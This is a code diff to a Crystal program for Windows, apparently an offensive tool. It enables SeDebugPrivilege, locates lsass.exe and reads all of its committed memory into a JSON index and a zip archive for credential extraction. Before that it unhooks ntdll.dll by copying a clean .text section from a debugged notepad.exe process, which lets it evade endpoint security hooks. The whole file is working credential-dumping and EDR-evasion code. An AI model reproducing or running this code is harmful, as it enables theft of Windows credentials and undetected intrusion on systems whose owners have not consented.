@@ -1,6 +1,5 @@
-require "pointer"
-require "zip64"
 require "option_parser"
+require "zip64"
 
 
 @[Link("ntdll")]
@@ -14,13 +13,7 @@ lib Ntdll
   fun NtClose(handle : LibC::HANDLE) : UInt32
   fun NtTerminateProcess(process_handle : LibC::HANDLE, exit_status : Int32) : UInt32
   fun NtProtectVirtualMemory(process_handle : UInt64, base_address : Pointer(Pointer(Void)), region_size : Pointer(UInt64), new_protect : UInt32, old_protect : Pointer(UInt32)) : Int32
-end
-
-
-@[Link("kernel32")]
-lib Kernel32
-  fun DebugActiveProcessStop(process_id : Int32) : Bool
-  # fun CustomCreateProcessW(application_name : LibC::LPWSTR,command_line : LibC::LPWSTR,process_attributes : Pointer(Void),thread_attributes : Pointer(Void),inherit_handles : Bool,creation_flags : UInt32,environment : Pointer(Void),current_directory : LibC::LPWSTR,startup_info : Pointer(Void),process_information : Pointer(Void)) : Bool
+  fun NtRemoveProcessDebug(process_handle : LibC::HANDLE, debug_object_handle : LibC::HANDLE) : Int32
 end
 
 
@@ -111,16 +104,6 @@ struct MEMORY_BASIC_INFORMATION
     @protect = protect
     @type = type
   end
-
-  def initialize
-    @base_address = 0
-    @allocation_base = 0
-    @allocation_protect = 0
-    @region_size = 0
-    @state = 0
-    @protect = 0
-    @type = 0
-  end
 end
 
 
@@ -173,29 +156,24 @@ struct PROCESS_INFORMATION
   property dw_process_id : Int32
   property dw_thread_id : Int32
 
-  # Initialize function
+  def get_h_process : LibC::HANDLE
+    @h_process
+  end
+  def get_h_thread : LibC::HANDLE
+    @h_thread
+  end
+  def get_dw_process_id : Int32
+    @dw_process_id
+  end
+  def get_dw_thread_id : Int32
+    @dw_thread_id
+  end
+
   def initialize(h_process : LibC::HANDLE, h_thread : LibC::HANDLE, dw_process_id : Int32, dw_thread_id : Int32)
     @h_process = h_process
     @h_thread = h_thread
     @dw_process_id = dw_process_id
     @dw_thread_id = dw_thread_id
-  end
-
-  # Getters
-  def get_h_process : LibC::HANDLE
-    @h_process
-  end
-
-  def get_h_thread : LibC::HANDLE
-    @h_thread
-  end
-
-  def get_dw_process_id : Int32
-    @dw_process_id
-  end
-
-  def get_dw_thread_id : Int32
-    @dw_thread_id
   end
 end
 
@@ -203,24 +181,19 @@ end
 def enable_se_debug_privilege : Bool
   hProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
   hToken = LibC::HANDLE.new(0.to_u64)  # Initialize hToken with 0
-
-  # Open the current process token using NtOpenProcessToken
   ntstatus = Ntdll.NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, pointerof(hToken))
   if ntstatus == 0 # STATUS_SUCCESS
-    # Convert SE_DEBUG_NAME to a Pointer(UInt16) (UTF-16 encoding)
     se_debug_name_utf16 = SE_DEBUG_NAME.to_utf16
     se_debug_name_ptr = se_debug_name_utf16.to_unsafe
-
     token_privileges = TOKEN_PRIVILEGES.new(
-      1,               # PrivilegeCount
+      1,
       UInt32.new(20),
-      UInt32.new(0),            # LUID
-      0x00000002.to_u32 # SE_PRIVILEGE_ENABLED
+      UInt32.new(0),
+      0x00000002.to_u32
     )
-
     ntstatus = Ntdll.NtAdjustPrivilegesToken(hToken, 0, pointerof(token_privileges), 0, nil, nil)
-    if ntstatus == 0 # STATUS_SUCCESS
-      puts "[+] SeDebugPrivilege enabled successfully!"
+    if ntstatus == 0
+      puts "[+] SeDebugPrivilege enabled: \tOK"
       return true
     else
       puts "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
@@ -228,103 +201,65 @@ def enable_se_debug_privilege : Bool
     end
   else
     puts "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
-    return true
+    return false
   end
 end
 
 
 def readRemoteIntPtr(h_process : Pointer(Void), mem_address : UInt64) : UInt64
-#def read_remote_intptr(h_process : UInt64, mem_address : UInt64) : UInt64
-  buffer = StaticArray(UInt8, 8).new(0) # Equivalent to `byte[] buff = new byte[8]`
-  bytes_read = Pointer(UInt64).malloc(1) # To store the number of bytes read
-
+  buffer = StaticArray(UInt8, 8).new(0)
+  bytes_read = Pointer(UInt64).malloc(1)
   ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address.to_u64), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
-
   if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && h_process != 0
     puts "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
   end
-
-  # Convert buffer to Int64
   value = buffer.to_slice.to_unsafe.as(Pointer(Int64)).value
-
   return value.to_u64
 end
 
 
 def readRemoteWStr(h_process : Pointer(Void), mem_address : UInt64) : String
-  buffer = StaticArray(UInt8, 256).new(0) # Equivalent to `byte[] buff = new byte[256]`
-  bytes_read = Pointer(UInt64).malloc(1)  # To store the number of bytes read
-
-  # Call NtReadVirtualMemory to read the remote memory
+  buffer = StaticArray(UInt8, 256).new(0)
+  bytes_read = Pointer(UInt64).malloc(1)
   ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
-
-  # Check for errors
   if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && !h_process.null?
     puts "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
   end
-
-  # Convert the buffer into a Unicode string
   unicode_str = String.build do |str|
     i = 0
     while i < buffer.size - 1
-      # Read 2 bytes at a time
-      char_code = (buffer[i] | (buffer[i + 1] << 8)) # Combine two bytes into a UTF-16 code unit
-      break if char_code == 0 # Null-terminated string
+      char_code = (buffer[i] | (buffer[i + 1] << 8))
+      break if char_code == 0
       str << char_code.chr
       i += 2
     end
   end
-
   return unicode_str
 end
 
 
 def get_proc_name_from_handle(process_handle : Pointer(Void)) : String
-  #puts "Process handle: #{process_handle}"
-
   process_basic_information_size = 48_u32
   commandline_offset = 0x68
-
-  # Create a byte array to hold PROCESS_BASIC_INFORMATION
   pbi_byte_array = Bytes.new(process_basic_information_size)
-
-  # Pointer to PROCESS_BASIC_INFORMATION structure
   pbi_addr = Pointer(UInt8).null
   pbi_addr = pbi_byte_array.to_unsafe
-
-  # Call NtQueryInformationProcess
   return_length = 0_u32
   ntstatus = Ntdll.NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
-
   if ntstatus != 0
     puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
     return ""
   end
-  #puts "ntstatus: #{ntstatus}"
-  
   peb_offset = 0x8
   peb_pointer = pbi_addr + peb_offset
-
   currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
   peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
-
   processparameters_offset = 0x20
   processparameters_pointer = peb_address + processparameters_offset
   processparameters_address = readRemoteIntPtr(process_handle, processparameters_pointer)
-  
   commandline_pointer = processparameters_address + commandline_offset
   commandline_address = readRemoteIntPtr(process_handle, commandline_pointer)
- 
   commandline_value = readRemoteWStr(process_handle, commandline_address)
-
-  #puts "peb_pointer: #{peb_pointer}"
-  #puts "peb_address: \t\t\t 0x#{peb_address.to_s(16)}"
-  #puts "processparameters_pointer: \t 0x#{processparameters_pointer.to_s(16)}"
-  #puts "commandline_pointer: \t\t 0x#{commandline_pointer.to_s(16)}"
-  #puts "commandline_address: \t\t 0x#{commandline_address.to_s(16)}"
-  #puts "commandline_value: \t\t #{commandline_value}"
-  #puts ""
-
   return commandline_value
 end
 
@@ -332,38 +267,17 @@ end
 def get_process_by_name(proc_name : String) : Pointer(Void)
   aux_handle = Pointer(Void).null
   maximum_allowed = 0x02000000
-
   while (Ntdll.NtGetNextProcess(aux_handle, maximum_allowed, 0, 0, pointerof(aux_handle)) == 0)
     commandline_value = get_proc_name_from_handle(aux_handle)
     if commandline_value.downcase == proc_name
       return aux_handle
     end
   end
-
   Pointer(Void).null
 end
 
 
-def print_mem_info(memfile_list : Array(MemFile))
-  memfile_list.each do |memfile|
-    filename = memfile.filename   # Assuming `filename` contains the file name as a String
-    bytes = memfile.content         # Assuming `bytes` contains the content of the file as a Bytes or Array(UInt8)
-    byte_count = bytes.size       # Get the total number of bytes
-    first_10_bytes = bytes[0, 10] # Extract the first 10 bytes (or fewer if the file is smaller)
-    
-    puts "Filename: #{filename}"
-    puts "Number of Bytes: #{byte_count}"
-    puts "First 10 Bytes: #{first_10_bytes.map { |byte| byte.to_s(16) }.join(' ')}" # Print as hex
-    puts "---"
-  end
-end
-
-# "\"field3\": #{module_info.size}}"
-#    end.join(", ") +
-#  "]"
-
-def writeToFile(memfile_list : Array(MemFile), filename = "barrel.json")
-  # Construct the JSON manually
+def writeToFile_Barrel(memfile_list : Array(MemFile), filename = "barrel.json")
   json_output = "[" +
     memfile_list.map do |module_info|
       "{\"field0\": \"#{module_info.filename}\", " +
@@ -371,12 +285,9 @@ def writeToFile(memfile_list : Array(MemFile), filename = "barrel.json")
       "\"field2\": #{module_info.size}}"
     end.join(", ") +
   "]"
-
-  # Write the JSON string to a file
   File.open(filename, "w") do |file|
     file.puts(json_output)
   end
-
   puts "[+] File #{filename} generated."
 end
 
@@ -395,25 +306,19 @@ end
 
 
 def barrel(filename = "barrel.json", zip_name = "trick.zip")
-  # Call the function to enable SeDebugPrivilege
   is_admin = enable_se_debug_privilege
   if is_admin == false
     puts "[-] Run file as administrator"
     return
   end
   lsass_handle = get_process_by_name("c:\\windows\\system32\\lsass.exe")
-  puts "[+] Lsass handle: \t#{lsass_handle.address}"
-
+  puts "[+] Lsass handle: \t\t#{lsass_handle.address}"
   proc_max_address = 0x7FFF_FFFE_FFFF_u64
   mem_address = 0_u64
   memfile_list = [] of MemFile
   aux_array = [] of String
-
   while mem_address < proc_max_address
-    #puts "mem_address: 0x#{mem_address.to_s(16)}"
-
-    # Populate MEMORY_BASIC_INFORMATION struct
-    mbi = MEMORY_BASIC_INFORMATION.new
+    mbi = MEMORY_BASIC_INFORMATION.new(0, 0, 0, 0, 0, 0, 0)
     ntstatus = Ntdll.NtQueryVirtualMemory(
       lsass_handle,
       Pointer(Void).new(mem_address),
@@ -422,17 +327,12 @@ def barrel(filename = "barrel.json", zip_name = "trick.zip")
       sizeof(MEMORY_BASIC_INFORMATION).to_u32,
       nil
     )
-
     if ntstatus != 0
       puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
       break
     end
-    #puts "NTSTATUS: 0x#{ntstatus.to_s(16)}"
-
-    # If readable and committed
     if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
       buffer = Bytes.new(mbi.region_size.to_i32) # Create a buffer to read memory region
-      # ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
       read_status = Ntdll.NtReadVirtualMemory(
         lsass_handle,
         Pointer(Void).new(mbi.base_address), #mbi.base_address,
@@ -440,31 +340,71 @@ def barrel(filename = "barrel.json", zip_name = "trick.zip")
         mbi.region_size.to_u32,
         nil
       )
-
       if read_status != 0 && read_status != 0x8000000d
         puts "[-] Error reading memory. NTSTATUS: 0x#{read_status.to_s(16)}"
       else
-        # Create a random filename for the memory dump
-        memdump_filename = "#{mem_address.to_s(16)}" #"#{random_string(10)}.#{random_string(3)}"
-
-        # Add memory info to JSON-like string array
+        memdump_filename = "#{mem_address.to_s(16)}"
         aux_array << %({"filename": "#{memdump_filename}", "address": "0x#{mem_address.to_s(16)}", "size": #{mbi.region_size}})
-
-        # Add memory content to the memfile_list
         memfile_list << MemFile.new(memdump_filename, buffer, mbi.region_size.to_u32)
       end
     end
-
-    # Next memory region
     mem_address += mbi.region_size
   end
-
-  # Close process handle
   Ntdll.NtClose(lsass_handle)
-
-  writeToFile(memfile_list, filename)
-
+  writeToFile_Barrel(memfile_list, filename)
   generate_zip(memfile_list, zip_name)
+end
+
+
+def custom_get_module_handle(h_process : Pointer(Void)) : Array(ModuleInformation)
+  module_information_list = Array(ModuleInformation).new
+  process_basic_information_size = 48_u32
+  peb_offset = 0x8
+  ldr_offset = 0x18
+  in_initialization_order_module_list_offset = 0x30
+  flink_dllbase_offset = 0x20
+  flink_buffer_fulldllname_offset = 0x40
+  flink_buffer_offset = 0x50
+  pbi_byte_array = Bytes.new(process_basic_information_size)
+  pbi_addr = Pointer(UInt8).null
+  pbi_addr = pbi_byte_array.to_unsafe
+  return_length = 0_u32
+  ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
+  if ntstatus != 0
+    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
+    return module_information_list
+  end
+  peb_pointer = pbi_addr + peb_offset
+  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
+  ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
+  ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
+  in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
+  next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)
+  dll_base = UInt64::MAX
+  while dll_base != 0
+    next_flink -= 0x10
+    # Get DLL base address
+    dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
+    buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)
+    # DLL base name
+    base_dll_name = ""
+    if buffer != 0
+      base_dll_name = readRemoteWStr(h_process, buffer)
+    end
+    # DLL full path
+    full_dll_path = readRemoteWStr(h_process, readRemoteIntPtr(h_process, next_flink + flink_buffer_fulldllname_offset))
+    if dll_base != 0
+      module_information_list << ModuleInformation.new(
+        base_dll_name: base_dll_name,
+        full_dll_path: full_dll_path.gsub("\\","\\\\"),
+        dll_base: dll_base,
+        size: 0
+      )
+    end
+    next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
+  end
+  return module_information_list
 end
 
 
@@ -476,106 +416,70 @@ def custom_get_module_address(h_process : Pointer(Void), module_name : String ) 
   flink_dllbase_offset = 0x20
   flink_buffer_fulldllname_offset = 0x40
   flink_buffer_offset = 0x50
-
-  # Pointer to PROCESS_BASIC_INFORMATION structure
   pbi_byte_array = Bytes.new(process_basic_information_size)
   pbi_addr = Pointer(UInt8).null
   pbi_addr = pbi_byte_array.to_unsafe
-
-  # Call NtQueryInformationProcess
   return_length = 0_u32
   ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
-
   if ntstatus != 0
     puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
     return 0_u64
   end
-  #puts "ntstatus: #{ntstatus}"
-
-  # Get PEB Base Address
-  #peb_pointer = Pointer(UInt64).new(pbi_byte_array[peb_offset].to_u64)
-  #peb_address = readRemoteIntPtr(h_process, peb_pointer.address)
   peb_pointer = pbi_addr + peb_offset
   currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
   peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
-
-  #puts "peb_pointer: 0x#{peb_pointer}"
-  #puts "peb_address: 0x#{peb_address.to_s(16)}"
-
-  # Get Ldr
   ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
   ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
-
   in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
   next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)
-
   dll_base = UInt64::MAX
   while dll_base != 0
     next_flink -= 0x10
-
     # DLL base name
     buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)
     base_dll_name = ""
     if buffer != 0
       base_dll_name = readRemoteWStr(h_process, buffer)
     end
-
     if base_dll_name == module_name
       # Get DLL base address
       dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
       return dll_base
     end
-      
     next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
   end
-
   return 0_u64
 end
 
 
-# Function to check and get the text section info from an image
 def get_text_section_info(ntdll_address : Pointer(Void)) : Array(UInt32)
-  h_process = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1 #LibC.GetCurrentProcess()
-
-  # Read e_lfanew at offset 0x3C (4 bytes)
+  h_process = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
   e_lfanew_data = Bytes.new(4)
   e_lfanew_address = ntdll_address + 0x3C
   Ntdll.NtReadVirtualMemory(h_process, e_lfanew_address, e_lfanew_data.to_unsafe, 4, Pointer(UInt64).null)
-
   e_lfanew = e_lfanew_data.to_unsafe.as(UInt32*).value #e_lfanew_data.unpack("I").first
   nt_headers_address = ntdll_address + e_lfanew
   optional_header_address = nt_headers_address + 24
-
-  # Read SizeOfCode at offset 4 from Optional Header
   sizeofcode_address = optional_header_address + 4
   sizeofcode_data = Bytes.new(4)
   Ntdll.NtReadVirtualMemory(h_process, sizeofcode_address, sizeofcode_data.to_unsafe, sizeofcode_data.size, Pointer(UInt64).null)
   sizeofcode = sizeofcode_data.to_unsafe.as(UInt32*).value
-
-  # Read BaseOfCode at offset 20 from Optional Header
   baseofcode_address = optional_header_address + 20
   baseofcode_data = Bytes.new(4)
   Ntdll.NtReadVirtualMemory(h_process, baseofcode_address, baseofcode_data.to_unsafe, baseofcode_data.size, Pointer(UInt64).null)
-
   baseofcode = baseofcode_data.to_unsafe.as(UInt32*).value
-
-  # Return the BaseOfCode and SizeOfCode
   [baseofcode, sizeofcode]
 end
 
 
-# Function to create a debug process and copy ntdll.dll text section
 def get_ntdll_from_debug_proc(process_path : String) : Pointer(UInt8)
-  # Step 1: Create debug process
   si = LibC::STARTUPINFOW.new
   si.cb = sizeof(STARTUPINFO)
-  #pi = LibC::PROCESS_INFORMATION.new(Pointer(Void).null, Pointer(Void).null, 0, 0)
   pi = LibC::PROCESS_INFORMATION.new
   pi.hProcess = Pointer(Void).null
   pi.hThread = Pointer(Void).null
   pi.dwProcessId = 0
   pi.dwThreadId = 0
-
   success = LibC.CreateProcessW(
     process_path.to_utf16, 
     nil, 
@@ -588,66 +492,60 @@ def get_ntdll_from_debug_proc(process_path : String) : Pointer(UInt8)
     pointerof(si), 
     pointerof(pi)
   )
-
   unless success
     puts "[-] Error calling CreateProcess"
     exit(1)
   end
-
-  # Step 2: Retrieve local ntdll.dll address and text section info
-  current_process = Pointer(Void).new(UInt64::MAX) # -1 (current process)
+  current_process = Pointer(Void).new(UInt64::MAX)
   local_ntdll_handle = custom_get_module_address(current_process, "ntdll.dll")
   result = get_text_section_info(Pointer(Void).new(local_ntdll_handle))
   local_ntdll_txt_base = result[0]
   local_ntdll_txt_size = result[1]
   local_ntdll_txt = local_ntdll_handle + local_ntdll_txt_base
-    
-  # Step 3: Read ntdll.dll text section into buffer
   ntdll_buffer = Bytes.new(local_ntdll_txt_size)
   read_result = Ntdll.NtReadVirtualMemory(pi.hProcess, Pointer(Void).new(local_ntdll_txt), ntdll_buffer.to_unsafe, ntdll_buffer.size, Pointer(UInt64).null)
-
   if read_result != 0
     puts "[-] Error calling NtReadVirtualMemory"
     exit(1)
   end
-
-  # Step 4: Copy buffer pointer
   p_ntdll_buffer = Pointer(UInt8).null
   p_ntdll_buffer = ntdll_buffer.to_unsafe
-
-  # Step 5: Cleanup and terminate debug process
-  debug_stop_result = Kernel32.DebugActiveProcessStop(pi.dwProcessId)
+  # Get debug object handle
+  debug_object_handle = uninitialized LibC::HANDLE
+  return_length = uninitialized UInt32
+  status = Ntdll.NtQueryInformationProcess(
+    pi.hProcess,
+    30,
+    pointerof(debug_object_handle).as(Pointer(UInt8)),
+    sizeof(LibC::HANDLE).to_u32,
+    pointerof(return_length)
+  )
+  # Cleanup and terminate debug process
+  status = Ntdll.NtRemoveProcessDebug(pi.hProcess, debug_object_handle)
   terminate_result = Ntdll.NtTerminateProcess(pi.hProcess, 0)
-
-  unless debug_stop_result
-    puts "#{debug_stop_result}"
-    puts "[-] Error calling DebugActiveProcessStop"
+  if status != 0
+    puts "[-] Error calling NtRemoveProcessDebug"
     exit(1)
   end
-
   if terminate_result != 0
     puts "[-] Error calling NtTerminateProcess. NTSTATUS: 0x#{terminate_result.to_s(16)}"
     exit(1)
   end
-
   close_handle_proc = Ntdll.NtClose(pi.hProcess)
   close_handle_thread = Ntdll.NtClose(pi.hThread)
-
   if close_handle_proc != 0 || close_handle_thread != 0
     puts "[-] Error calling NtClose"
     exit(1)
   end
-
   # Return the buffer pointer
   p_ntdll_buffer
 end
 
 
-# Overwrite hooked ntdll .text section with a clean version
 def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void*, local_ntdll_txt_size : UInt32)
   dw_old_protection = UInt32.new(0)
-  current_process = UInt64::MAX # -1_i32 # (HANDLE)(-1) is equivalent to the current process in Windows API
-  region_size_ptr = Pointer(UInt64).malloc(1)   # Pointer for UInt64
+  current_process = UInt64::MAX
+  region_size_ptr = Pointer(UInt64).malloc(1)
   region_size_ptr.value = local_ntdll_txt_size
   dw_old_protection = UInt32.new(0)
   
@@ -728,7 +626,6 @@ def main()
     process_path = "C:\\Windows\\System32\\notepad.exe"
     remap_library(process_path)
   end
-
   barrel(json_name, zip_name)
 end
 
